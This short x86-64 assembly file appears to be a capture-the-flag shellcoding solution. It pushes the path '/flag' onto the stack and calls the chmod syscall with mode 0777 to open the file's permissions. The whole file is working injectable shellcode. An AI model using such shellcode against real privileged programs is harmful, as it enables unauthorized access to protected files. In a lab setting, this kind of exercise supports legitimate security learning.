.intel_syntax noprefix

# same as level10

.section .text    

    mov rax, 0x67616c662f   # encoded string: /flag

    push rax                # saving to stack

    mov rdi, rsp
    mov rsi, 0x1ff          # hex for 777 octal
    mov rax, 90
    syscall
